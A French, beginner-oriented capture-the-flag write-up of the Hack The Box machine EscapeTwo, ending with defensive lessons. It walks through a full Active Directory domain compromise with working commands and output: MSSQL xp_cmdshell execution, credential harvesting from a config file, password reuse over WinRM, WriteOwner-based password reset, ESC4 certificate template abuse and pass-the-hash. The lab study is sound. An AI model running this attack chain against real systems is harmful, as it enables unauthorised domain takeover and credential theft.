# HTB EscapeTwo — Writeup Complet pour Débutants


## Résumé de l'attaque

```
Creds fournis (rose)
    → Enumération MSSQL
        → xp_cmdshell → fichier de config SQL
            → Mot de passe sql_svc → réutilisé par ryan
                → WinRM en tant que ryan (user.txt)
                    → WriteOwner sur ca_svc
                        → Changement de mdp ca_svc
                            → ESC4 sur template AD CS
                                → Certificat Administrator
                                    → Hash NTLM Admin (root.txt)
```

---

## Prérequis & Concepts

### Qu'est-ce qu'un Domain Controller (DC) ?
Un Domain Controller est le serveur central d'un réseau Windows. Il gère :
- Les utilisateurs et leurs mots de passe
- Les permissions sur les ressources
- L'authentification (via Kerberos)

### Qu'est-ce qu'Active Directory (AD) ?
C'est la base de données qui tourne sur le DC. Elle contient tous les objets du domaine : utilisateurs, machines, groupes, politiques de sécurité.

### Outils utilisés
| Outil | Rôle |
|-------|------|
| `nmap` | Scanner les ports ouverts |
| `nxc` (NetExec) | Tester des credentials sur SMB/WinRM/MSSQL |
| `impacket-mssqlclient` | Se connecter à une base SQL distante |
| `evil-winrm` | Shell interactif Windows à distance |
| `dacledit.py` | Lire/modifier les permissions AD |
| `owneredit.py` | Changer le propriétaire d'un objet AD |
| `rpcclient` | Exécuter des commandes RPC Windows |
| `certipy` | Attaquer les certificats AD (AD CS) |

---

## Étape 0 — Connexion VPN

Avant tout, on se connecte au réseau HTB via VPN :

```bash
sudo openvpn machines_eu-1.ovpn
```

On vérifie qu'on est connecté (interface `tun0` avec une IP 10.x.x.x) :
```bash
ip a show tun0
```

---

## Étape 1 — Reconnaissance (nmap)

### Commande
```bash
nmap -sV -Pn -p 53,88,135,139,389,445,3389 10.129.232.128
```

### Explication des options
- `-sV` : détecte les versions des services
- `-Pn` : ne ping pas avant de scanner (la machine bloque les pings)
- `-p` : liste des ports à scanner

### Résultat important
```
53/tcp  → DNS (Simple DNS Plus)
88/tcp  → Kerberos (authentification Windows)
389/tcp → LDAP (Active Directory)
445/tcp → SMB (partage de fichiers Windows)
Domain  : sequel.htb
Host    : DC01
```

Ces ports sont typiques d'un **Domain Controller Windows**.

### Ajout dans /etc/hosts
Pour que les outils puissent résoudre le nom de domaine :
```bash
echo "10.129.232.128 DC01.sequel.htb sequel.htb DC01" | sudo tee -a /etc/hosts
```

---

## Étape 2 — Connexion MSSQL

### Contexte
On nous donne des credentials de départ : `rose / KxEPkKe6R8su`.  
En énumérant les shares SMB, on découvre un share "Accounting Department" avec des fichiers Excel contenant des credentials MSSQL : `sa / MSSQLP@ssw0rd!`

`sa` est le compte **System Administrator** de Microsoft SQL Server — le compte le plus puissant du serveur SQL.

### Vérification avec NetExec
```bash
nxc mssql 10.129.232.128 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
```
**Résultat** : `[+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)`  
→ Les credentials fonctionnent.

### Connexion au serveur SQL
```bash
impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.129.232.128
```

On est maintenant dans un prompt SQL `SQL (sa dbo@master)>`.

---

## Étape 3 — Activation de xp_cmdshell

### Qu'est-ce que xp_cmdshell ?
C'est une fonctionnalité de MSSQL qui permet d'**exécuter des commandes Windows** directement depuis SQL. Elle est désactivée par défaut car très dangereuse.

### Activation (tout sur une ligne car impacket ne persiste pas les changements)
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Test
```sql
EXEC xp_cmdshell 'whoami';
```
**Résultat** : `sequel\sql_svc`  
→ On exécute des commandes en tant que le compte de service SQL.

---

## Étape 4 — Lecture du fichier de configuration SQL

### Pourquoi ce fichier ?
Le fichier `sql-Configuration.INI` est créé lors de l'installation de SQL Server. Il contient souvent des **mots de passe en clair** saisis pendant l'installation.

### Recherche du fichier
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'dir /s /b C:\*configuration*.ini 2>nul';
```
**Résultat** : `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`

### Lecture du fichier
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI';
```

### Résultat crucial
```ini
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

On trouve le **mot de passe en clair** du compte `sql_svc` : `WqSZAF6CysDQbGb3`

---

## Étape 5 — Réutilisation de mot de passe → Shell WinRM

### Qu'est-ce que WinRM ?
**Windows Remote Management** (port 5985) — c'est le protocole qui permet d'avoir un **shell interactif à distance** sur Windows. L'équivalent de SSH pour Windows.

### Énumération des utilisateurs du domaine
```bash
nxc smb 10.129.232.128 -u sql_svc -p 'WqSZAF6CysDQbGb3' --users
```

Utilisateurs trouvés : `Administrator`, `michael`, `ryan`, `oscar`, `sql_svc`, `rose`, `ca_svc`

### Test de réutilisation de mot de passe
On teste si `sql_svc` et `ryan` partagent le même mot de passe (erreur humaine courante) :

```bash
nxc winrm 10.129.232.128 -u michael ryan oscar -p 'WqSZAF6CysDQbGb3'
```

**Résultat** : `sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)`  
→ Ryan avait utilisé son propre mot de passe pour configurer le service SQL !

### Connexion avec evil-winrm
```bash
evil-winrm -i 10.129.232.128 -u ryan -p 'WqSZAF6CysDQbGb3'
```

On récupère le **premier flag** :
```powershell
type C:\Users\ryan\Desktop\user.txt
```

---

## Étape 6 — Escalade de privilèges via AD CS (ESC4)

### Qu'est-ce qu'AD CS ?
**Active Directory Certificate Services** est le service Windows qui gère les certificats numériques dans le domaine. Ces certificats peuvent servir à s'authentifier en tant que n'importe quel utilisateur, y compris Administrator.

### Découverte des permissions AD

On analyse les permissions AD avec dacledit :
```bash
for user in michael oscar ca_svc; do
  echo "=== $user ===";
  ~/tools/pipx/venvs/bloodhound/bin/dacledit.py -action read -target $user -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3' 2>/dev/null | grep -B2 "WriteOwner"
done
```

**Résultat** : Ryan a `WriteOwner` sur `ca_svc` (le compte de service de la Certificate Authority).

### Qu'est-ce que WriteOwner ?
Cette permission permet de **se mettre propriétaire** d'un objet AD. Le propriétaire peut ensuite modifier toutes les permissions de cet objet.

### Exploitation : Prendre le contrôle de ca_svc

**Étape 1 — Ryan se met propriétaire de ca_svc :**
```bash
~/tools/pipx/venvs/bloodhound/bin/owneredit.py -action write -new-owner ryan -target ca_svc -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3'
```

**Étape 2 — Ryan se donne le droit de changer le mot de passe de ca_svc :**
```bash
~/tools/pipx/venvs/bloodhound/bin/dacledit.py -action write -rights ResetPassword -principal ryan -target ca_svc -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3'
```

**Étape 3 — Changer le mot de passe de ca_svc :**
```bash
rpcclient -U "sequel.htb/ryan%WqSZAF6CysDQbGb3" 10.129.232.128 -c "setuserinfo2 ca_svc 23 'Password123!'"
```

### Découverte du template vulnérable avec Certipy

On relance certipy avec le compte `ca_svc` (qui est membre du groupe **Cert Publishers**) :
```bash
certipy find -u ca_svc@sequel.htb -p 'Password123!' -dc-ip 10.129.232.128 -vulnerable
```

**Résultat** : Template **DunderMifflinAuthentication** vulnérable à **ESC4**

### Qu'est-ce qu'ESC4 ?
ESC4 = le groupe `Cert Publishers` a des **droits de modification complets** sur le template de certificat. On peut donc modifier le template pour s'autoriser à demander un certificat au nom de n'importe qui (y compris Administrator).

### Exploitation ESC4

**Étape 1 — Modifier le template pour activer l'enrollement libre :**
```bash
certipy template -u ca_svc@sequel.htb -p 'Password123!' -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -write-default-configuration
```

**Étape 2 — Demander un certificat au nom d'Administrator :**
```bash
certipy req -u ca_svc@sequel.htb -p 'Password123!' -dc-ip 10.129.232.128 -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

**Résultat** : `administrator.pfx` généré

### Récupération du hash NTLM d'Administrator

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.232.128
```

**Résultat** : `7a8d4e04986afa8ed4060f75e5a0b3ff`

### Connexion en tant qu'Administrator (Pass-the-Hash)

```bash
evil-winrm -i 10.129.232.128 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

On récupère le **flag root** :
```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Résumé des credentials trouvés

| Compte | Mot de passe | Comment trouvé |
|--------|-------------|----------------|
| rose | KxEPkKe6R8su | Fourni par HTB |
| sa (MSSQL) | MSSQLP@ssw0rd! | Share SMB "Accounting Department" |
| sql_svc | WqSZAF6CysDQbGb3 | Fichier sql-Configuration.INI |
| ryan | WqSZAF6CysDQbGb3 | Réutilisation du mdp de sql_svc |
| ca_svc | Password123! | Changé via WriteOwner |
| Administrator | Hash NTLM | Certificat ESC4 |

---

## Leçons retenues

1. **Ne jamais réutiliser ses mots de passe** entre comptes personnels et comptes de service
2. **Les fichiers de configuration** contiennent souvent des mots de passe en clair
3. **xp_cmdshell** est extrêmement dangereux sur un serveur MSSQL exposé
4. **AD CS mal configuré** (ESC4) permet de compromettre tout un domaine
5. **WriteOwner** est une permission très dangereuse à ne pas accorder à des comptes non-administrateurs
